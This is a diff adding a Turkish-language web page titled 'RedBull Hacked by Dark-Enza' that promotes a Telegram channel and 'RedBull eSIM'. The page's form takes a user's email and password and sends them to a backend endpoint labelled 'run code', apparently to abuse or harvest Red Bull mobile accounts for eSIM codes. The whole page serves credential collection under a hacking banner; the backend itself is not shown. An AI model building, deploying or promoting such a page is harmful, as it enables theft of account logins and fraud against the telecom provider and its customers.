@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>RedBull Hacked by Dark-Enza</title>
+    <style>
+        body {
+            background: url('https://media.tenor.com/myPHsReL2YIAAAAd/hacker.gif') center/cover; /* Replace 'your-gif-url-here.gif' with the actual GIF URL */
+            color: #00ffcc; /* Neon cyan text color */
+            font-family: Arial, sans-serif;
+            margin: 0; /* Remove default body margin */
+            display: flex;
+            justify-content: center; /* Center horizontally */
+            align-items: center; /* Center vertically */
+            height: 100vh; /* Ensure full viewport height */
+        }
+        #container {
+            width: 300px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5); /* Transparent black background */
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: none;
+            border-radius: 5px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #00ffcc;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background: linear-gradient(135deg, #ff1493, #00ffcc); /* Gradient between pink and neon cyan */
+            color: #00ffcc;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background: linear-gradient(135deg, #c71585, #00ffcc); /* Gradient between darker pink and lighter neon cyan */
+        }
+        #keyResult {
+            font-size: 18px;
+            margin-top: 20px;
+            color: #ff1493; /* Pink text color */
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h2>TG Channel @dwstoree</h2>
+        <h2>RedBull eSIM</h2>
+        <form id="keyForm">
+            <label for="email">Eposta:</label>
+            <input type="email" id="email" required><br> <!-- Use type="email" for email validation -->
+            <label for="password">Şifre:</label>
+            <input type="password" id="password" required><br>
+            <button type="button" onclick="executeCode()">Kodu Çalıştır</button>
+        </form>
+        <p id="keyResult"></p>
+    </div>
+    <script>
+        function executeCode() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            
+            if (email === "" || password === "") {
+                document.getElementById("keyResult").innerHTML = "Hata: Eposta ve şifre alanları boş bırakılamaz!";
+            } else if (!validateEmail(email)) {
+                document.getElementById("keyResult").innerHTML = "Hata: Geçerli bir eposta girin!";
+            } else {
+                var data = {
+                    email: email,
+                    password: password
+                };
+                
+                fetch("/kod_yurut", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => response.json())
+                .then(result => {
+                    document.getElementById("keyResult").innerHTML = "Kod çalıştırıldı: " + result.result;
+                })
+                .catch(error => {
+                    console.error("Hata:", error);
+                });
+            }
+        }
+        
+        function validateEmail(email) {
+            var re = /\S+@\S+\.\S+/;
+            return re.test(email);
+        }
+    </script>
+</body>
+</html>
